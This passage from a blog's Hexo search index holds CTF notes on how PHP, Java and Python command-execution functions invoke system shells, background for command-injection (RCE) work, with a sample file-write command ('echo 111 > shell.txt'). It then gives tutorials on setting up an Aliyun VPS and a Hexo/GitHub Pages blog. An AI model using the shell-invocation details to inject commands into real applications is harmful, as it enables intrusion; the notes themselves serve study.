Explorer工具进行跟踪分析</li></ol></li><li>命令执行函数在bash中调用的命令是<code>/bin/sh -c &quot;...&quot;</code><ol><li>这里单引号和双引号一样，都可以变量替换 -&gt; <code>/bin/sh -c &#39;echo $SHELL&#39;</code>也可以正确输出</li></ol></li><li>在<code>system</code>的实验下都只是调用了一个子进程<code>/bin/sh</code></li><li>Shell 执行：PHP 中的shell_exec 、 exec和system等函数调用系统的 shell（通常为&#x2F;bin&#x2F;sh或&#x2F;bin&#x2F;bash ）来执行命令。这意味着他们启动一个新的 shell 进程来解释您提供的命令字符串</li></ol><h3 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 与php不同的模型</span></span><br><span class="line">Java - 底层不调用系统终端，自己启动传入的可执行程序    Mode =&gt; Window：Command || Linux：Command</span><br></pre></td></tr></table></figure><ol><li>在Java语言里面，针对Linux平台，系统命令<code>echo 111 &gt; shell.txt</code>传入CommandExecFunc函数，最终在底层相当于执行<code>/bin/echo 111 &gt; shell.txt</code><ol><li>这里的echo作为可执行程序出现，而不是终端中的命令，没有整体再次进行解释</li></ol></li><li>window中也一样</li><li>无 Shell 开销：由于 Java 默认情况下不通过 shell，因此您可以更直接地控制命令的执行，但这也意味着您可能需要自己处理环境变量、命令行解析和输出重定向（如果需要）</li></ol><h3 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 和php一样</span></span><br><span class="line">Python - 底层调用系统终端，执行命令     Mode =&gt; Window：cmd.exe /c Command || Linux：sh -c Command</span><br></pre></td></tr></table></figure><h2 id="Dive-into-PHP"><a href="#Dive-into-PHP" class="headerlink" title="Dive into PHP"></a>Dive into PHP</h2><blockquote><p>重点关注: system, exec, shell_exec, passthru 四个函数</p></blockquote><ol><li><p>这一部分就详见qftm的文章吧，写的很好，我来小小<em><strong>总结</strong></em></p><ol><li><p>linux中system、exec、passthru、shell_exec这类命令执行函数底层在linux中都是调用<code>/bin/sh -c &#39;...&#39;</code>这样的，是通过源码看出来的 –&gt; 这里的&#x2F;bin&#x2F;sh在不同平台中所指向的链接不同，debian系默认&#x2F;bin&#x2F;sh指向&#x2F;bin&#x2F;dash；redhat系默认&#x2F;bin&#x2F;sh指向&#x2F;bin&#x2F;bash</p><blockquote><p>最初，bash是GNU&#x2F;Linux 操作系统中 &#x2F;bin&#x2F;sh 的符号链接，但由于bash过于复杂，有人把 bash 从 NetBSD 移植到 Linux 并更名为 dash，且&#x2F;bin&#x2F;sh符号连接到dash。Dash Shell 比 Bash Shell 小的多（ubuntu16.04上，bash大概1M，dash只有150K），符合POSIX标准。Ubuntu 6.10开始默认是Dash。</p></blockquote></li><li><p>windows中都是cmd.exe</p></li><li><p><em><strong>QUICK判断</strong></em>: 如果单纯的是想知道某个命令执行函数是否调用cmd.exe终端去执行系统指令的话，可以在php脚本里面写一个循环，然后观察进程创建情况即可：简单、粗暴</p></li></ol></li><li><p>关于exec()</p><ol><li>在官方手册的评论中有这样一句话，很是受益，平时找的时候可以关注一下评论<a href="https://www.php.net/function.exec">111</a></li></ol> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">In Windows, <span class="built_in">exec</span>() issues an internal call to <span class="string">&quot;cmd /c your_command&quot;</span>. This implies that your <span class="built_in">command</span> must follow the rules imposed by cmd.exe <span class="built_in">which</span> includes an extra <span class="built_in">set</span> of quotes around the full <span class="built_in">command</span>:</span><br><span class="line"></span><br><span class="line">- http://ss64.com/nt/cmd.html</span><br><span class="line"></span><br><span class="line">Current PHP versions take this into account and add the quotes automatically, but old versions didn<span class="string">&#x27;t.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Apparently, the change was made in PHP/5.3.0 yet not backported to 5.2.x because it&#x27;</span>s a backwards incompatible change. To <span class="built_in">sum</span> up:</span><br><span class="line"></span><br><span class="line">- In PHP/5.2 and older you have to surround the full <span class="built_in">command</span> plus arguments <span class="keyword">in</span> double quotes</span><br><span class="line">- In PHP/5.3 and greater you don<span class="string">&#x27;t have to (if you do, your script will break)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">If you are interested in the internals, this is the source code:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">sprintf(cmd, &quot;%s /c \&quot;%s\&quot;&quot;, TWG(comspec), command); </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">It can be found at http://svn.php.net/viewvc/ (please find php/php-src/trunk/TSRM/tsrm_win32.c, the comment system doesn&#x27;</span>t allow the direct <span class="built_in">link</span>).</span><br></pre></td></tr></table></figure></li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> rce </tag>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctf3r的第一台vps(2024)</title>
      <link href="/2024/10/25/ctf3r%E7%9A%84%E7%AC%AC%E4%B8%80%E5%8F%B0vps/"/>
      <url>/2024/10/25/ctf3r%E7%9A%84%E7%AC%AC%E4%B8%80%E5%8F%B0vps/</url>
      
        <content type="html"><![CDATA[<blockquote><p>给曾经一窍不通的自己的总结，其实看官方文档就ok了，这一篇做一个记录，后面忘记了也可以quick start</p></blockquote><h2 id="1-购买服务器"><a href="#1-购买服务器" class="headerlink" title="1. 购买服务器"></a>1. 购买服务器</h2><ol><li>建议<ol><li>看看优惠页面，直接搜索即可</li><li>看看试用</li><li>如果是学生的话搜索时添加个学生就够了</li><li>入门的话感觉瞄准阿里云(免费额度也够)就好了，不用太在不同平台间挣扎浪费时间</li></ol></li><li>我现在暂时用的是阿里云的服务器试用，美味的白嫖<ol><li>注意自己注意时间，给的是要3个月内使用的300元体验</li><li>一个月检查一次吧</li></ol></li></ol><h2 id="2-配置-vscode"><a href="#2-配置-vscode" class="headerlink" title="2. 配置 + vscode"></a>2. 配置 + vscode</h2><ol><li><a href="https://help.aliyun.com/zh/ecs/getting-started/getting-started?spm=a2c4g.11186623.0.0.4802629cDcbhgp">看看官方入门文档</a></li><li>安全组设置<ol><li>点击快速配置中有http, https, ssh, rdp就够了，配置后记得切换使用这个的</li></ol></li><li>配置一下密钥对<ol><li>有一些没有可以选择root或者ecs-user的机型可能会有出现无法登录root的情况 –&gt; <a href="https://help.aliyun.com/zh/ecs/use-cases/log-on-to-a-linux-instance-by-using-an-ssh-key-pair-as-a-regular-user">看看这篇</a></li><li>还要给自己的新用户增加sudo用户组后续方便操作，阿里云自己的操作系统是centos系的，查看组<code>cat /etc/group</code>，<code>usermod -aG wheel username</code>后<code>groups username</code>一下</li></ol></li><li>接着就直接在vscode中搞一下<ol><li>连接配置<ol><li>wsl无法再连向远程了，cs144是因为再容器中；需要再windows中设置</li></ol></li><li>文件传输配置(local-&gt;remote) –&gt; 无法remote-&gt;local, 否则我就不用来开vps了<ol><li>在windows中使用的，可以直接cv</li><li>也可以考虑wsl文件先放到Win中，然后win中在终端传到云服务器上<ol><li>wsl中设置环境变量<code>YUN</code>方便将文件传入到windows中<code>cp my_file $YUN</code>，windows中可以直接使用<code>toYUN</code>别名切换到$YUN文件夹中来传文件(我用到bash)</li><li>在windows中使用<code>toh3110w0r1d</code>来开启sftp服务(<strong>文件相对路径默认传输到<code>/home/user/</code>文件夹下</strong>)，使用<code>bye</code>或者<code>exit</code>来退出</li><li>可以使用<code>ls</code>, <code>cd</code>, <code>pwd</code>, <code>rm</code>, <code>mkdir</code>, <code>rmdir</code>来管理<ol><li><code>get -r remote_file remote_dir</code></li><li><code>put -r local_file remote_dir</code></li></ol></li></ol></li></ol></li></ol></li></ol><h2 id="3-搭建网页"><a href="#3-搭建网页" class="headerlink" title="3. 搭建网页"></a>3. 搭建网页</h2><ol><li><a href="https://help.aliyun.com/zh/ecs/use-cases/summary-of-website-building-methods?spm=a2c4g.11186623.0.0.66c840f10Z91oO#p-43l-u9m-c5v">阿里云教程</a></li><li>搭建node.js环境，有教程，直接看就好</li><li>搞一个路由文件就OK了，方便进行文件包含和访问</li></ol><h2 id="4-域名设置"><a href="#4-域名设置" class="headerlink" title="4. 域名设置"></a>4. 域名设置</h2><ol><li>我搞的是github学生包里的namecheap中的免费一年的.me域名，折腾一下就好了</li><li><a href="https://zhuanlan.zhihu.com/p/634806678">参考文章链接</a><ol><li>注意要从github活动页进去才可以</li></ol></li><li>最后在wsl(我的话)使用<code>nslookup</code>来查询域名即可</li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctfenv </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>利用hexo和github搭建个人独立博客</title>
      <link href="/2023/12/05/%E5%88%A9%E7%94%A8hexo%E5%92%8Cgithub%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E7%8B%AC%E7%AB%8B%E5%8D%9A%E5%AE%A2/"/>
      <url>/2023/12/05/%E5%88%A9%E7%94%A8hexo%E5%92%8Cgithub%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E7%8B%AC%E7%AB%8B%E5%8D%9A%E5%AE%A2/</url>
      
        <content type="html"><![CDATA[<h2 id="1-前置工具-环境"><a href="#1-前置工具-环境" class="headerlink" title="1. 前置工具&amp;&amp;环境"></a>1. 前置工具&amp;&amp;环境</h2><ol><li>github</li><li>Node.js</li><li>hexo</li><li>git</li></ol><h2 id="2-下载node-js和git"><a href="#2-下载node-js和git" class="headerlink" title="2. 下载node.js和git"></a>2. 下载node.js和git</h2><ol><li><a href="https://git-scm.com/">Git官网</a><ol><li>点击download下载即可，一路next没啥问题<br> <img src="/pic/%E5%88%A9%E7%94%A8hexo%E5%92%8Cgithub%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E7%8B%AC%E7%AB%8B%E5%8D%9A%E5%AE%A2/%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2Z1.png" alt="Git Download"></li></ol></li><li><a href="https://nodejs.cn/">node.js官网</a><ol><li>Hexo是基于 Node.js 驱动的一款博客框架</li><li>也是直接点击download即可<br> <img src="/pic/%E5%88%A9%E7%94%A8hexo%E5%92%8Cgithub%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E7%8B%AC%E7%AB%8B%E5%8D%9A%E5%AE%A2/%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2Z2.png" alt="node.js Download"></li></ol></li><li>以上两个下载完成后再cmd控制台中输入以下，有出现版本号即可<ol><li>node -v</li><li>npm -v</li><li>git -v<br> <img src="/pic/%E5%88%A9%E7%94%A8hexo%E5%92%8Cgithub%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E7%8B%AC%E7%AB%8B%E5%8D%9A%E5%AE%A2/%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2Z3.png" alt="CMD显示"></li></ol></li></ol><h2 id="3-安装hexo"><a href="#3-安装hexo" class="headerlink" title="3. 安装hexo"></a>3. 安装hexo</h2><ol><li>在自己的目录中新建一个文件夹来存放你的博客文章<br> <img src="/pic/%E5%88%A9%E7%94%A8hexo%E5%92%8Cgithub%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E7%8B%AC%E7%AB%8B%E5%8D%9A%E5%AE%A2/%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A24.png" alt="hexo目录建立"></li><li>进入文件夹中，右键选择”显示更多选项”，点击git bash<ol><li>跟换淘宝源(下载更快一点)，使用命令行<code>npm install -g cnpm --registry=https:\//registry.npm.taobao.org</code><br> <img src="/pic/%E5%88%A9%E7%94%A8hexo%E5%92%8Cgithub%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E7%8B%AC%E7%AB%8B%E5%8D%9A%E5%AE%A2/%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A25.png" alt="淘宝源"></li><li>下载hexo，使用命令<code>cnpm install -g hexo-cli</code></li><li>进行初始化，使用命令<code>hexo init</code>，并且文件夹中多出一堆文章(发现自己少了什么也没事，下图是写博客时照的，init成功一般就好了)<br> <img src="/pic/%E5%88%A9%E7%94%A8hexo%E5%92%8Cgithub%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E7%8B%AC%E7%AB%8B%E5%8D%9A%E5%AE%A2/%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A26.png" alt="hexo init"><br> <img src="/pic/%E5%88%A9%E7%94%A8hexo%E5%92%8Cgithub%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E7%8B%AC%E7%AB%8B%E5%8D%9A%E5%AE%A2/%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A27.png" alt="hexo init"></li><li>在git bash中输入<code>hexo s</code>或者<code>hexo server</code>(二者一样)，有hello world界面就好了(这个界面是自带的)，出现这个界面也就成功了，hexo安装正常完毕<br> <img src="/pic/%E5%88%A9%E7%94%A8hexo%E5%92%8Cgithub%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E7%8B%AC%E7%AB%8B%E5%8D%9A%E5%AE%A2/%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A28.png" alt="hexo s"></li></ol></li></ol><h2 id="4-注册github并创建库"><a href="#4-注册github并创建库" class="headerlink" title="4. 注册github并创建库"></a>4. 注册github并创建库</h2><ol><li><a href="https://github.com/">github网站</a><ol><li>需要魔法(可以直接用steam++加速github单个，现在改名叫<a href="https://steampp.net/">Watt Tookie</a>)</li><li>如果是未使用过的用户需要先注册，<em><strong>sign up</strong></em>按要求走就可以了</li><li>注册之后邮箱会收到一封Github的邮件，点击Github的链接确认注册即可<br>  <img src="/pic/%E5%88%A9%E7%94%A8hexo%E5%92%8Cgithub%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E7%8B%AC%E7%AB%8B%E5%8D%9A%E5%AE%A2/%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A29.png" alt="注册图片"></li></ol></li><li>注册完毕后，创建一个仓库<ol><li>点击右上角个人头像，点击其中的Your repositories<br>  <img src="/pic/%E5%88%A9%E7%94%A8hexo%E5%92%8Cgithub%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E7%8B%AC%E7%AB%8B%E5%8D%9A%E5%AE%A2/%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A210.png" alt="创建仓库"></li><li>点击右上角绿色的new按钮，输入仓库名，选择public类型，其他不用去改动它<ol><li>注意此处的仓库名一定要是<em><strong>用户名.github.io</strong></em>，否则会打不开网页<br>  <img src="/pic/%E5%88%A9%E7%94%A8hexo%E5%92%8Cgithub%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E7%8B%AC%E7%AB%8B%E5%8D%9A%E5%AE%A2/%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A211.png" alt="初始化仓库"></li></ol></li><li>复制下ssh，下面要用<br>  <img src="/pic/%E5%88%A9%E7%94%A8hexo%E5%92%8Cgithub%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E7%8B%AC%E7%AB%8B%E5%8D%9A%E5%AE%A2/%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A212.png" alt="ssh"></li></ol></li></ol><h2 id="5-设置ssh密钥"><a href="#5-设置ssh密钥" class="headerlink" title="5. 设置ssh密钥"></a>5. 设置ssh密钥</h2><ol><li>首先生成ssh公钥<ol><li>在git bash下输入<code>cd ~/.ssh</code>进入ssh文件</li><li>在git bash中的ssh文件中输入命令<code>ssh-keygen -t rsa -C 注册时的邮箱地址</code></li></ol></li><li>配置ssh到github中<ol><li>在我的电脑中打开<em><strong>C盘</strong></em>找到 <em><strong>用户</strong></em>，进入发现有一个.ssh的文件夹</li><li>点击进去看见<br>  <img src="/pic/%E5%88%A9%E7%94%A8hexo%E5%92%8Cgithub%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E7%8B%AC%E7%AB%8B%E5%8D%9A%E5%AE%A2/%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A213.png" alt="ssh"></li><li>接下来要点开<em><strong>id_rsa.pub文件，不能是id_rsa文件</strong></em>(如果点击会改变，需要重开)，<em><strong>从头到尾复制下来</strong></em>(ssh-rsa 也要)</li><li>回到github同样点击右上角头像，找到setting按键, 将刚刚在.ssh目录下所复制的id_rsa.put文件中的信息复制进key,名字的话随便取都可以<br>  <img src="/pic/%E5%88%A9%E7%94%A8hexo%E5%92%8Cgithub%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E7%8B%AC%E7%AB%8B%E5%8D%9A%E5%AE%A2/%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A214.png" alt="ssh"><br>  <img src="/pic/%E5%88%A9%E7%94%A8hexo%E5%92%8Cgithub%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E7%8B%AC%E7%AB%8B%E5%8D%9A%E5%AE%A2/%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A215.png" alt="ssh"></li><li>验证是否添加成功，输入命令<code>ssh -T git@github.com</code>并且输入yes之后，行末尾会显示你的用户名，同时会有邮箱提醒</li></ol></li><li>最后对本地的git进行全局配置<ol><li>输入命令：<code>git config --global user.name &quot;注册时用户名&quot;</code></li><li>输入命令：<code>git config --global user.email &quot;注册时邮箱&quot;</code></li></ol></li></ol><h2 id="6-撰写文章并发布"><a href="#6-撰写文章并发布" class="headerlink" title="6. 撰写文章并发布"></a>6. 撰写文章并发布</h2><ol><li><p>先打开目录下的_config.yml文件</p><ol><li><p>ctrl+f搜索关键字deploy</p></li><li><p>将deploy部分替换为</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">deploy:  </span><br><span class="line">   type: git  </span><br><span class="line">   repo: git@github.com:用户名/用户名.github.io.git    #这个是使用ssh的格式，注释可以不用加入</span><br><span class="line">   branch: main</span><br></pre></td></tr></table></figure></li></ol></li><li><p>需要安装上传工具</p><ol><li>在gitbash中输入命令 <em><strong>cnpm install hexo-deployer-git</strong></em></li><li>需要在文件的根目录下运行命令</li></ol></li><li><p>在hexo中创建文章(md格式)</p><ol><li>在hexo中写博客是要浅学以下markdown的喔，一天基本就能学会了</li><li>写markdown的文章我是直接使用vscode，网上教程看一下就好</li><li>使用hexo new命令创建新文章<ol><li>在哪里使用该命令都可以，会自动在soure中的_posts文件夹下产生md文件(也可以直接_posts文件夹中右键创建)<br>  <img src="/pic/%E5%88%A9%E7%94%A8hexo%E5%92%8Cgithub%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E7%8B%AC%E7%AB%8B%E5%8D%9A%E5%AE%A2/%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A216.png" alt="hexo new"></li></ol></li></ol></li><li><p>进行文章编写后预览</p><ol><li>vscode中文章编写完成后ctrl+s保存</li><li>在git bash中输入命令(在哪都可以)<code>hexo s</code>或者<code>hexo server</code>(上文有提到过)</li><li>会返回一个本机网址，进入网址即可看到自己的博客界面(默认主题未上传)</li></ol></li><li><p>将文章上传至github上</p><ol><li>输入命令<code>hexo g</code>先生成静态文件再<code>hexo d</code>部署到github上</li><li>再次访问个人网站即会出现你所作的更改啦(有时要等一会儿，不会马上就改变)</li></ol></li></ol><h2 id="7-结语"><a href="#7-结语" class="headerlink" title="7. 结语"></a>7. 结语</h2><p>到这里hexo+github搭建个人博客就已经完成了，开始记录从0到1的成长之路吧！！！</p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
